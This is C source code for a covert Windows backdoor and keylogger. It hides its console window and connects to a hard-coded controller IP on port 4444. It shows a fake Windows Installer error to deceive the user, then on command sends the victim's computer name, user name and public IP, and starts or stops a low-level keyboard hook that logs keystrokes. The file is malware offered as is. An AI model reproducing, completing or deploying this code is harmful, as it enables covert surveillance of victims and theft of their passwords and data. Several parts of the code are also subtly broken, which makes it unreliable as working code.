#ifdef _WIN32
	char OS[] = "Windows";
#else
	char OS[] = "Other";
#endif

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <unistd.h>

#define bzero(p, size)  (void) memset((p),0,(size))

HHOOK hook;
LPMSG msg;
FILE *LOG;

HANDLE LogThread;

struct sockaddr_in serv_addr, cli_addr;
int sock_fd = 0, newsock_fd = 0, clilen = 0, n = 0, sock;
char WANIP[32];

void ErrorMessage(const char *msg) {
	perror (msg);
}

void WANIPLOCATE() {

	HINTERNET hInternet, hFile;
	DWORD rSize;
	hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	hFile = InternetOpenUrl(hInternet, "https://bot.whatismyipaddress.com/", NULL, 0, INTERNET_FLAG_RELOAD, 0);
	InternetReadFile(hFile, &WANIP, sizeof(WANIP), &rSize);
	WANIP[rSize] = '\0';
	InternetCloseHandle(hFile);
	InternetCloseHandle(hInternet);
}

LRESULT CALLBACK KeyboardHook(int code, WPARAM wParam, LPARAM lParam) {
	LOG = fopen("Log.txt", "a+");
	if (wParam == WM_KEYDOWN) {
		fputs((char *) lParam, LOG);
		fclose(LOG);
	}
	return CallNextHookEx(hook, code, wParam, lParam);
}

void keyStart() {
	hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHook, NULL, 0);
	if (hook != NULL) {
		// success
	}
	else {
		// fail
	}
	while(GetMessage(msg, NULL, 0, 0 > 0)) {
		TranslateMessage(msg);
		DispatchMessage(msg);
	}
}

void Shell() {

	WANIPLOCATE();

	char info[] = "info";
	char close[] = "close";
	char buffer[1024];
	char start_log[] = "start_log";
	char stop_log[] = "stop_log";
	DWORD bufCharCount = 32767;
	char InfoBuf1[32767];
	char InfoBuf2[32767];

	while (1) {
		bzero(buffer, 1024);
		n = recv(sock, buffer, 1024, 0);

		if(strncmp(buffer, close, strlen(close)) == 0) {
			closesocket(sock);
			WSACleanup();
			exit(0);
		}

		else if(strncmp(buffer, info, strlen(info)) == 0) {
			GetComputerName(InfoBuf1, &bufCharCount);
			GetUserName(InfoBuf2, &bufCharCount);

			n = send(sock, InfoBuf1, strlen(InfoBuf1), 0);
			n = send(sock, InfoBuf2, strlen(InfoBuf2), 0);
			sleep(1);
			n = send(sock, OS, strlen(OS), 0);
			n = send(sock, WANIP, strlen(WANIP), 0);
		}

		else if(strncmp(buffer, start_log, strlen(start_log)) == 0) {
			LogThread = (HANDLE)_beginthread(&keyStart, 0, 0);
			n = send(sock, "START", 5, 0);
		}

		else if(strncmp(buffer, stop_log, strlen(stop_log)) == 0) {
			if(TerminateThread(LogThread, 0) == 0) {
				n = send(sock, "FAIL", 4, 0);
			}
			else {
				n = send(sock, "STOP", 4, 0);
			}
		}
	


	else {
		n = send(sock, "[!!] Functie Niet Compleet", 1024, 0);
	}

   }


}




int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {

	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);

	struct sockaddr_in ServAddr;
	unsigned short ServPort;
	char *ServIP;
	WSADATA wsaData;

	ServIP = "192.168.198.130";
	ServPort = 4444;

	if(WSAStartup(MAKEWORD(2,0),&wsaData) != 0) {
		exit(1);
	}

	if((sock = socket(AF_INET, SOCK_STREAM, 0)) > 0)

	memset(&ServAddr, 0, sizeof(ServAddr));
	ServAddr.sin_family		= AF_INET;
	ServAddr.sin_addr. s_addr	= inet_addr(ServIP);
	ServAddr.sin_port		= htons(ServPort);

	if(connect(sock, (struct sockaddr *)&ServAddr, sizeof(ServAddr)) < 0)
		return 0;

	MessageBox(NULL, TEXT("installeren is gefaald!"), TEXT("Windows Installer"), MB_OK | MB_ICONERROR);
	Shell(); 
}



